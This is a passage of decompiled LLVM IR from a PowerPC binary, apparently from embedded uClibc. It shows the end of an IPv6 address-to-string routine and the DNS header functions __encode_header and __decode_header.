dec_label_pc_1000f124:                            ; preds = %dec_label_pc_1000f110
  %v3_1000f11c = inttoptr i32 %v2_1000f11c to i8*
  store i8 58, i8* %v3_1000f11c, align 1
  %v0_1000f120 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f120 = add i32 %v0_1000f120, 1
  store i32 %v1_1000f120, i32* %r29.global-to-local, align 4
  %v0_1000f124.pre = load i32, i32* @r31, align 4
  %v1_1000f124 = icmp slt i32 %v0_1000f124.pre, 6
  %v3_1000f124 = icmp eq i32 %v0_1000f124.pre, 6
  store i1 %v1_1000f124, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f124, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f124, label %dec_label_pc_1000f12c, label %dec_label_pc_1000f188

dec_label_pc_1000f12c:                            ; preds = %dec_label_pc_1000f124
  %v0_1000f12c = load i32, i32* @r28, align 4
  %v1_1000f12c = icmp slt i32 %v0_1000f12c, 0
  %v3_1000f12c = icmp eq i32 %v0_1000f12c, 0
  store i1 %v1_1000f12c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f12c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f12c, label %dec_label_pc_1000f134, label %dec_label_pc_1000f188

dec_label_pc_1000f134:                            ; preds = %dec_label_pc_1000f12c
  %v0_1000f134 = load i32, i32* @r30, align 4
  %v1_1000f134 = icmp slt i32 %v0_1000f134, 6
  %v3_1000f134 = icmp eq i32 %v0_1000f134, 6
  store i1 %v1_1000f134, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f134, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f134, label %dec_label_pc_1000f158, label %dec_label_pc_1000f13c

dec_label_pc_1000f13c:                            ; preds = %dec_label_pc_1000f134
  %v1_1000f13c = icmp slt i32 %v0_1000f134, 5
  %v3_1000f13c = icmp eq i32 %v0_1000f134, 5
  store i1 %v1_1000f13c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f13c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f13c, label %dec_label_pc_1000f144, label %dec_label_pc_1000f188

dec_label_pc_1000f144:                            ; preds = %dec_label_pc_1000f13c
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1000f150, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f150, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000f150, label %dec_label_pc_1000f158, label %dec_label_pc_1000f188

dec_label_pc_1000f158:                            ; preds = %dec_label_pc_1000f144, %dec_label_pc_1000f134
  %v1_1000f158 = load i32, i32* @r1, align 4
  %v2_1000f158 = sub i32 %v1_1000f158, %v1_1000f120
  %v0_1000f15c = load i32, i32* @r27, align 4
  %v1_1000f15c = add i32 %v0_1000f15c, 12
  %v1_1000f160 = add i32 %v2_1000f158, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1000f16c.408 to i32), i32* @lr, align 4
  %v3_1000f168 = call i32 @inet_ntop4(i32 %v1_1000f15c, i32 %v1_1000f120, i32 %v1_1000f160)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000f170 = icmp slt i32 %v3_1000f168, 0
  %v3_1000f170 = icmp eq i32 %v3_1000f168, 0
  store i1 %v1_1000f170, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f170, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f170, label %dec_label_pc_1000f228, label %dec_label_pc_1000f178

dec_label_pc_1000f178:                            ; preds = %dec_label_pc_1000f158
  %v0_1000f178 = load i32, i32* @r29, align 4
  store i32 %v0_1000f178, i32* @r3, align 4
  %v0_1000f17c = call i32 @__GI_strlen()
  %v0_1000f180 = load i32, i32* @r29, align 4
  %v2_1000f180 = add i32 %v0_1000f180, %v0_1000f17c
  store i32 %v2_1000f180, i32* %r29.global-to-local, align 4
  %v0_1000f1c0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000f1c0

dec_label_pc_1000f188:                            ; preds = %dec_label_pc_1000f124.thread, %dec_label_pc_1000f144, %dec_label_pc_1000f13c, %dec_label_pc_1000f12c, %dec_label_pc_1000f124
  %v0_1000f18867 = phi i32 [ 0, %dec_label_pc_1000f124.thread ], [ 6, %dec_label_pc_1000f144 ], [ 6, %dec_label_pc_1000f13c ], [ 6, %dec_label_pc_1000f12c ], [ %v0_1000f124.pre, %dec_label_pc_1000f124 ]
  %v0_1000f16466 = phi i32 [ %v2_1000f11c, %dec_label_pc_1000f124.thread ], [ %v1_1000f120, %dec_label_pc_1000f144 ], [ %v1_1000f120, %dec_label_pc_1000f13c ], [ %v1_1000f120, %dec_label_pc_1000f12c ], [ %v1_1000f120, %dec_label_pc_1000f124 ]
  %v1_1000f188 = mul i32 %v0_1000f18867, 4
  store i32 %v2_1000efe0, i32* %r9.global-to-local, align 4
  %v2_1000f190 = add i32 %v1_1000f188, %v2_1000efe0
  %v3_1000f190 = inttoptr i32 %v2_1000f190 to i32*
  %v4_1000f190 = load i32, i32* %v3_1000f190, align 4
  store i32 %v0_1000f16466, i32* @r3, align 4
  store i32 268497320, i32* @lr, align 4
  %v5_1000f1a4 = load i32, i32* @r7, align 4
  %v6_1000f1a4 = load i32, i32* @r8, align 4
  %v9_1000f1a4 = call i32 @sprintf(i32 %v0_1000f16466, i32 ptrtoint ([3 x i8]* @global_var_10012b74.409 to i32), i32 %v4_1000f190, i32 %v2_1000efe0, i32 %v5_1000f1a4, i32 %v6_1000f1a4, i32 %v2_1000efe0, i32 ptrtoint (i32* @0 to i32))
  %v0_1000f1a8 = load i32, i32* @r29, align 4
  %v2_1000f1a8 = add i32 %v0_1000f1a8, %v9_1000f1a4
  store i32 %v2_1000f1a8, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f1ac

dec_label_pc_1000f1ac:                            ; preds = %dec_label_pc_1000f0fc, %dec_label_pc_1000f100, %dec_label_pc_1000f188
  %v2_1000f10451 = phi i32 [ %v2_1000f11c, %dec_label_pc_1000f0fc ], [ %v1_1000f108, %dec_label_pc_1000f100 ], [ %v2_1000f1a8, %dec_label_pc_1000f188 ]
  %v0_1000f1ac = load i32, i32* @r31, align 4
  %v1_1000f1ac = add i32 %v0_1000f1ac, 1
  store i32 %v1_1000f1ac, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1000f1ac, 8
  %v0_1000f0e0 = load i32, i32* @r28, align 4
  %v1_1000f0e0 = icmp slt i32 %v0_1000f0e0, -1
  %v3_1000f0e0 = icmp eq i32 %v0_1000f0e0, -1
  store i1 %v1_1000f0e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f0e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1000f0e0, label %dec_label_pc_1000f1b8

dec_label_pc_1000f1b8:                            ; preds = %dec_label_pc_1000f1ac
  br i1 %v3_1000f0e0, label %dec_label_pc_1000f1d8, label %dec_label_pc_1000f1c0

dec_label_pc_1000f1c0:                            ; preds = %dec_label_pc_1000f1b8, %dec_label_pc_1000f178
  %v2_1000f1d0 = phi i32 [ %v2_1000f10451, %dec_label_pc_1000f1b8 ], [ %v2_1000f180, %dec_label_pc_1000f178 ]
  %v0_1000f1c0 = phi i32 [ %v0_1000f0e0, %dec_label_pc_1000f1b8 ], [ %v0_1000f1c0.pre, %dec_label_pc_1000f178 ]
  %v1_1000f1c0 = load i32, i32* @r30, align 4
  %v2_1000f1c0 = add i32 %v1_1000f1c0, %v0_1000f1c0
  %v1_1000f1c4 = icmp slt i32 %v2_1000f1c0, 8
  %v3_1000f1c4 = icmp eq i32 %v2_1000f1c0, 8
  store i1 %v1_1000f1c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f1c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f1c4, label %dec_label_pc_1000f1cc, label %dec_label_pc_1000f1d8

dec_label_pc_1000f1cc:                            ; preds = %dec_label_pc_1000f1c0
  %v3_1000f1d0 = inttoptr i32 %v2_1000f1d0 to i8*
  store i8 58, i8* %v3_1000f1d0, align 1
  %v0_1000f1d4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f1d4 = add i32 %v0_1000f1d4, 1
  store i32 %v1_1000f1d4, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f1d8

dec_label_pc_1000f1d8:                            ; preds = %dec_label_pc_1000f1c0, %dec_label_pc_1000f1b8, %dec_label_pc_1000f1cc
  %v2_1000f1ec = phi i32 [ %v2_1000f1d0, %dec_label_pc_1000f1c0 ], [ %v2_1000f10451, %dec_label_pc_1000f1b8 ], [ %v1_1000f1d4, %dec_label_pc_1000f1cc ]
  %v1_1000f1d8 = sub i32 1, %v2_1000f0d4
  %v2_1000f1e0 = add i32 %v1_1000f1d8, %v2_1000f1ec
  %v1_1000f1e4 = load i32, i32* @r26, align 4
  %v2_1000f1e4 = icmp ult i32 %v2_1000f1e0, %v1_1000f1e4
  %v4_1000f1e4 = icmp eq i32 %v2_1000f1e0, %v1_1000f1e4
  store i1 %v2_1000f1e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f1e4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f1ec = inttoptr i32 %v2_1000f1ec to i8*
  store i8 0, i8* %v3_1000f1ec, align 1
  %v0_1000f1f0 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000f1f0 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000f1f0 = or i1 %v0_1000f1f0, %v1_1000f1f0
  br i1 %v2_1000f1f0, label %dec_label_pc_1000f208, label %dec_label_pc_1000f1f4

dec_label_pc_1000f1f4:                            ; preds = %dec_label_pc_1000f1d8
  %v0_1000f1f4 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000f200 = inttoptr i32 %v0_1000f1f4 to i32*
  store i32 28, i32* %v2_1000f200, align 4
  %v0_1000f22c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f228

dec_label_pc_1000f208:                            ; preds = %dec_label_pc_1000f1d8
  %v0_1000f208 = load i32, i32* @r25, align 4
  %v2_1000f20c = bitcast i32* %stack_var_-88 to i8*
  %v3_1000f20c = call i32 @strcpy(i32 %v0_1000f208, i8* %v2_1000f20c)
  br label %dec_label_pc_1000f210

dec_label_pc_1000f210:                            ; preds = %dec_label_pc_1000efcc, %dec_label_pc_1000f208
  %storemerge1 = phi i32 [ %v3_1000efd8, %dec_label_pc_1000efcc ], [ %v3_1000f20c, %dec_label_pc_1000f208 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f228

dec_label_pc_1000f218:                            ; preds = %dec_label_pc_1000efc0
  %v0_1000f218 = call i32 @__errno_location()
  %v2_1000f220 = inttoptr i32 %v0_1000f218 to i32*
  store i32 97, i32* %v2_1000f220, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f228

dec_label_pc_1000f228:                            ; preds = %dec_label_pc_1000f158, %dec_label_pc_1000f210, %dec_label_pc_1000f1f4, %dec_label_pc_1000f218
  %v0_1000f22c = phi i32 [ 0, %dec_label_pc_1000f158 ], [ %storemerge1, %dec_label_pc_1000f210 ], [ %v0_1000f22c.pre, %dec_label_pc_1000f1f4 ], [ 0, %dec_label_pc_1000f218 ]
  ret i32 %v0_1000f22c

; uselistorder directives
  uselistorder i32 %v2_1000f1ec, { 1, 0 }
  uselistorder i32 %v2_1000f1c0, { 1, 0 }
  uselistorder i1 %v3_1000f0e0, { 0, 2, 1 }
  uselistorder i32 %v0_1000f0e0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000f1ac, { 2, 1, 0 }
  uselistorder i32 %v0_1000f16466, { 1, 0 }
  uselistorder i32 %v3_1000f168, { 1, 0 }
  uselistorder i32 %v0_1000f134, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000f124.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1000f120, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1000f0f0, { 1, 0 }
  uselistorder i32 %v0_1000f110, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1000f0f0, { 0, 2, 1 }
  uselistorder i32 %v2_1000f11c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000f0e03, { 0, 2, 1 }
  uselistorder i32 %v0_1000f0c8, { 2, 1, 0 }
  uselistorder i32 %v0_1000f0b8.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1000f0c0, { 1, 0, 2 }
  uselistorder i32 %v1_1000f09c, { 2, 1, 0 }
  uselistorder i32 %v1_1000f098, { 1, 0 }
  uselistorder i32 %v0_1000f07c39, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1000f08c42, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1000f050, { 1, 0 }
  uselistorder i32 %v0_1000f098, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1000f050, { 1, 0 }
  uselistorder i32 %v0_1000f07c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1000f08c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000f02c, { 1, 0 }
  uselistorder i32 %v2_1000f024, { 1, 0 }
  uselistorder i32 %v0_1000f01c, { 1, 0, 2 }
  uselistorder i32 %v1_1000f004, { 1, 0 }
  uselistorder i32 %v2_1000efe0, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i32 97, { 4, 5, 8, 7, 6, 0, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32* @r8, { 5, 10, 11, 12, 1, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 69, 70, 71, 72, 2, 62, 66, 67, 68, 8, 9, 74, 73, 76, 77, 43, 63, 64, 65, 75, 44, 45, 46, 47, 48, 49, 50, 3, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 0, 61, 4, 7, 6 }
  uselistorder i32* @r7, { 10, 11, 12, 13, 0, 14, 15, 16, 17, 1, 18, 19, 6, 20, 21, 22, 23, 2, 35, 36, 37, 8, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 7, 4, 5, 33, 34, 9 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 11, 0, 12, 13, 14, 7, 8, 9, 5, 6, 10, 15 }
  uselistorder i1 true, { 3, 0, 5, 6, 1, 2, 4 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 23, 22, 11, 2, 6, 5, 15, 0, 7, 1, 14, 21, 20, 19, 18, 17, 16, 13, 12, 10, 9, 8, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000f228, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f210, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f1ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f188, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000f0e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f0d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f0b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f098, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000f094, { 1, 0 }
  uselistorder label %dec_label_pc_1000f04c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f004, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_1000f324, label %dec_label_pc_1000f24c

dec_label_pc_1000f24c:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1000f24c = add i32 %tmp, 2
  %v2_1000f24c = inttoptr i32 %v1_1000f24c to i8*
  %v3_1000f24c = load i8, i8* %v2_1000f24c, align 1
  %v4_1000f24c = zext i8 %v3_1000f24c to i32
  store i32 %v4_1000f24c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_1000f24c, i8* %tmp3, align 1
  %v2_1000f258 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f258, i32* %r0.global-to-local, align 4
  %v1_1000f25c = trunc i32 %v2_1000f258 to i8
  %v4_1000f25c = add i32 %arg2, 1
  %v5_1000f25c = inttoptr i32 %v4_1000f25c to i8*
  store i8 %v1_1000f25c, i8* %v5_1000f25c, align 1
  %v1_1000f260 = add i32 %tmp, 12
  %v2_1000f260 = inttoptr i32 %v1_1000f260 to i32*
  %v3_1000f260 = load i32, i32* %v2_1000f260, align 4
  store i32 %v3_1000f260, i32* %r0.global-to-local, align 4
  %v1_1000f264 = add i32 %tmp, 16
  %v2_1000f264 = inttoptr i32 %v1_1000f264 to i32*
  %v3_1000f264 = load i32, i32* %v2_1000f264, align 4
  store i32 %v3_1000f264, i32* %r11.global-to-local, align 4
  %v1_1000f268 = add i32 %tmp, 4
  %v2_1000f268 = inttoptr i32 %v1_1000f268 to i32*
  %v3_1000f268 = load i32, i32* %v2_1000f268, align 4
  %v2_1000f26c = icmp ne i32 %v3_1000f260, 0
  %v5_1000f270 = zext i1 %v2_1000f26c to i32
  store i32 %v5_1000f270, i32* %r10.global-to-local, align 4
  %v1_1000f274 = add i32 %tmp, 8
  %v2_1000f274 = inttoptr i32 %v1_1000f274 to i32*
  %v3_1000f274 = load i32, i32* %v2_1000f274, align 4
  %v2_1000f278 = icmp ne i32 %v3_1000f264, 0
  %v5_1000f27c = zext i1 %v2_1000f278 to i32
  %v1_1000f280 = add i32 %tmp, 20
  %v2_1000f280 = inttoptr i32 %v1_1000f280 to i32*
  %v3_1000f280 = load i32, i32* %v2_1000f280, align 4
  store i32 %v3_1000f280, i32* %r0.global-to-local, align 4
  %not.v2_1000f284 = icmp eq i32 %v3_1000f268, 0
  %v6_1000f288 = sext i1 %not.v2_1000f284 to i32
  store i32 %v5_1000f27c, i32* %r11.global-to-local, align 4
  %v1_1000f290 = call i32 @__asm_rlwinm(i32 %v6_1000f288, i32 0, i32 24, i32 24)
  %v0_1000f294 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f294 = mul i32 %v0_1000f294, 4
  store i32 %v1_1000f294, i32* %r10.global-to-local, align 4
  %v1_1000f298 = call i32 @__asm_rlwinm(i32 %v3_1000f274, i32 3, i32 25, i32 28)
  %v0_1000f29c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f29c = icmp ne i32 %v0_1000f29c, 0
  %v5_1000f2a0 = zext i1 %v2_1000f29c to i32
  %v2_1000f2a4 = or i32 %v1_1000f294, %v1_1000f298
  store i32 %v2_1000f2a4, i32* %r10.global-to-local, align 4
  %v1_1000f2a8 = add i32 %v1_1000f290, 128
  %v0_1000f2ac = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f2ac = mul i32 %v0_1000f2ac, 2
  store i32 %v1_1000f2ac, i32* %r11.global-to-local, align 4
  %v2_1000f2b0 = or i32 %v2_1000f2a4, %v5_1000f2a0
  store i32 %v2_1000f2b0, i32* %r0.global-to-local, align 4
  %v2_1000f2b4 = or i32 %v2_1000f2b0, %v1_1000f2a8
  %v2_1000f2b8 = or i32 %v2_1000f2b4, %v1_1000f2ac
  %v1_1000f2bc = trunc i32 %v2_1000f2b8 to i8
  %v4_1000f2bc = add i32 %arg2, 2
  %v5_1000f2bc = inttoptr i32 %v4_1000f2bc to i8*
  store i8 %v1_1000f2bc, i8* %v5_1000f2bc, align 1
  %v1_1000f2c0 = add i32 %tmp, 24
  %v2_1000f2c0 = inttoptr i32 %v1_1000f2c0 to i32*
  %v3_1000f2c0 = load i32, i32* %v2_1000f2c0, align 4
  %v1_1000f2c4 = add i32 %tmp, 28
  %v2_1000f2c4 = inttoptr i32 %v1_1000f2c4 to i32*
  %v3_1000f2c4 = load i32, i32* %v2_1000f2c4, align 4
  store i32 %v3_1000f2c4, i32* %r0.global-to-local, align 4
  %not.v2_1000f2c8 = icmp eq i32 %v3_1000f2c0, 0
  %v6_1000f2cc = sext i1 %not.v2_1000f2c8 to i32
  %v1_1000f2d0 = call i32 @__asm_rlwinm(i32 %v6_1000f2cc, i32 0, i32 24, i32 24)
  %v1_1000f2d4 = urem i32 %v3_1000f2c4, 16
  store i32 %v1_1000f2d4, i32* %r0.global-to-local, align 4
  %v1_1000f2d8 = add i32 %v1_1000f2d0, 128
  %v2_1000f2dc = or i32 %v1_1000f2d4, %v1_1000f2d8
  %v1_1000f2e0 = trunc i32 %v2_1000f2dc to i8
  %v4_1000f2e0 = add i32 %arg2, 3
  %v5_1000f2e0 = inttoptr i32 %v4_1000f2e0 to i8*
  store i8 %v1_1000f2e0, i8* %v5_1000f2e0, align 1
  %v1_1000f2e4 = add i32 %tmp, 34
  %v2_1000f2e4 = inttoptr i32 %v1_1000f2e4 to i8*
  %v3_1000f2e4 = load i8, i8* %v2_1000f2e4, align 1
  %v4_1000f2e4 = zext i8 %v3_1000f2e4 to i32
  store i32 %v4_1000f2e4, i32* %r0.global-to-local, align 4
  %v4_1000f2e8 = add i32 %arg2, 4
  %v5_1000f2e8 = inttoptr i32 %v4_1000f2e8 to i8*
  store i8 %v3_1000f2e4, i8* %v5_1000f2e8, align 1
  %v1_1000f2ec = add i32 %tmp, 32
  %v2_1000f2ec = inttoptr i32 %v1_1000f2ec to i32*
  %v3_1000f2ec = load i32, i32* %v2_1000f2ec, align 4
  store i32 %v3_1000f2ec, i32* %r0.global-to-local, align 4
  %v1_1000f2f0 = trunc i32 %v3_1000f2ec to i8
  %v4_1000f2f0 = add i32 %arg2, 5
  %v5_1000f2f0 = inttoptr i32 %v4_1000f2f0 to i8*
  store i8 %v1_1000f2f0, i8* %v5_1000f2f0, align 1
  %v1_1000f2f4 = add i32 %tmp, 38
  %v2_1000f2f4 = inttoptr i32 %v1_1000f2f4 to i8*
  %v3_1000f2f4 = load i8, i8* %v2_1000f2f4, align 1
  %v4_1000f2f4 = zext i8 %v3_1000f2f4 to i32
  store i32 %v4_1000f2f4, i32* %r0.global-to-local, align 4
  %v4_1000f2f8 = add i32 %arg2, 6
  %v5_1000f2f8 = inttoptr i32 %v4_1000f2f8 to i8*
  store i8 %v3_1000f2f4, i8* %v5_1000f2f8, align 1
  %v1_1000f2fc = add i32 %tmp, 36
  %v2_1000f2fc = inttoptr i32 %v1_1000f2fc to i32*
  %v3_1000f2fc = load i32, i32* %v2_1000f2fc, align 4
  store i32 %v3_1000f2fc, i32* %r0.global-to-local, align 4
  %v1_1000f300 = trunc i32 %v3_1000f2fc to i8
  %v4_1000f300 = add i32 %arg2, 7
  %v5_1000f300 = inttoptr i32 %v4_1000f300 to i8*
  store i8 %v1_1000f300, i8* %v5_1000f300, align 1
  %v1_1000f304 = add i32 %tmp, 42
  %v2_1000f304 = inttoptr i32 %v1_1000f304 to i8*
  %v3_1000f304 = load i8, i8* %v2_1000f304, align 1
  %v4_1000f304 = zext i8 %v3_1000f304 to i32
  store i32 %v4_1000f304, i32* %r0.global-to-local, align 4
  %v4_1000f308 = add i32 %arg2, 8
  %v5_1000f308 = inttoptr i32 %v4_1000f308 to i8*
  store i8 %v3_1000f304, i8* %v5_1000f308, align 1
  %v1_1000f30c = add i32 %tmp, 40
  %v2_1000f30c = inttoptr i32 %v1_1000f30c to i32*
  %v3_1000f30c = load i32, i32* %v2_1000f30c, align 4
  store i32 %v3_1000f30c, i32* %r0.global-to-local, align 4
  %v1_1000f310 = trunc i32 %v3_1000f30c to i8
  %v4_1000f310 = add i32 %arg2, 9
  %v5_1000f310 = inttoptr i32 %v4_1000f310 to i8*
  store i8 %v1_1000f310, i8* %v5_1000f310, align 1
  %v1_1000f314 = add i32 %tmp, 46
  %v2_1000f314 = inttoptr i32 %v1_1000f314 to i8*
  %v3_1000f314 = load i8, i8* %v2_1000f314, align 1
  %v4_1000f314 = zext i8 %v3_1000f314 to i32
  store i32 %v4_1000f314, i32* %r0.global-to-local, align 4
  %v4_1000f318 = add i32 %arg2, 10
  %v5_1000f318 = inttoptr i32 %v4_1000f318 to i8*
  store i8 %v3_1000f314, i8* %v5_1000f318, align 1
  %v1_1000f31c = add i32 %tmp, 44
  %v2_1000f31c = inttoptr i32 %v1_1000f31c to i32*
  %v3_1000f31c = load i32, i32* %v2_1000f31c, align 4
  store i32 %v3_1000f31c, i32* %r0.global-to-local, align 4
  %v1_1000f320 = trunc i32 %v3_1000f31c to i8
  %v4_1000f320 = add i32 %arg2, 11
  %v5_1000f320 = inttoptr i32 %v4_1000f320 to i8*
  store i8 %v1_1000f320, i8* %v5_1000f320, align 1
  %v0_1000f324.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000f324

dec_label_pc_1000f324:                            ; preds = %entry, %dec_label_pc_1000f24c
  %v0_1000f324 = phi i32 [ -1, %entry ], [ %v0_1000f324.pre, %dec_label_pc_1000f24c ]
  ret i32 %v0_1000f324

; uselistorder directives
  uselistorder i32 %v1_1000f2d4, { 1, 0 }
  uselistorder i32 %v1_1000f2ac, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32 38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f324, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000f32c = load i8, i8* %arg1, align 1
  %v4_1000f32c = zext i8 %v3_1000f32c to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000f334 = add i32 %tmp, 1
  %v3_1000f334 = inttoptr i32 %v2_1000f334 to i8*
  %v4_1000f334 = load i8, i8* %v3_1000f334, align 1
  %v5_1000f334 = zext i8 %v4_1000f334 to i32
  %v1_1000f33c = mul nuw nsw i32 %v4_1000f32c, 256
  %v2_1000f340 = or i32 %v5_1000f334, %v1_1000f33c
  %v2_1000f344 = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000f340, i32* %v2_1000f344, align 4
  %v0_1000f348 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f348 = add i32 %v0_1000f348, 2
  %v2_1000f348 = inttoptr i32 %v1_1000f348 to i8*
  %v3_1000f348 = load i8, i8* %v2_1000f348, align 1
  %v4_1000f348 = zext i8 %v3_1000f348 to i32
  %v1_1000f34c = call i32 @__asm_rlwinm(i32 %v4_1000f348, i32 25, i32 31, i32 31)
  %v2_1000f350 = add i32 %arg2, 4
  %v3_1000f350 = inttoptr i32 %v2_1000f350 to i32*
  store i32 %v1_1000f34c, i32* %v3_1000f350, align 4
  %v0_1000f354 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f354 = add i32 %v0_1000f354, 2
  %v2_1000f354 = inttoptr i32 %v1_1000f354 to i8*
  %v3_1000f354 = load i8, i8* %v2_1000f354, align 1
  %v4_1000f354 = zext i8 %v3_1000f354 to i32
  %v1_1000f358 = call i32 @__asm_rlwinm(i32 %v4_1000f354, i32 29, i32 28, i32 31)
  %v2_1000f35c = add i32 %arg2, 8
  %v3_1000f35c = inttoptr i32 %v2_1000f35c to i32*
  store i32 %v1_1000f358, i32* %v3_1000f35c, align 4
  %v0_1000f360 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f360 = add i32 %v0_1000f360, 2
  %v2_1000f360 = inttoptr i32 %v1_1000f360 to i8*
  %v3_1000f360 = load i8, i8* %v2_1000f360, align 1
  %v4_1000f360 = zext i8 %v3_1000f360 to i32
  %v1_1000f364 = call i32 @__asm_rlwinm(i32 %v4_1000f360, i32 30, i32 31, i32 31)
  %v2_1000f368 = add i32 %arg2, 12
  %v3_1000f368 = inttoptr i32 %v2_1000f368 to i32*
  store i32 %v1_1000f364, i32* %v3_1000f368, align 4
  %v0_1000f36c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f36c = add i32 %v0_1000f36c, 2
  %v2_1000f36c = inttoptr i32 %v1_1000f36c to i8*
  %v3_1000f36c = load i8, i8* %v2_1000f36c, align 1
  %v4_1000f36c = zext i8 %v3_1000f36c to i32
  %v1_1000f370 = call i32 @__asm_rlwinm(i32 %v4_1000f36c, i32 31, i32 31, i32 31)
  %v2_1000f374 = add i32 %arg2, 16
  %v3_1000f374 = inttoptr i32 %v2_1000f374 to i32*
  store i32 %v1_1000f370, i32* %v3_1000f374, align 4
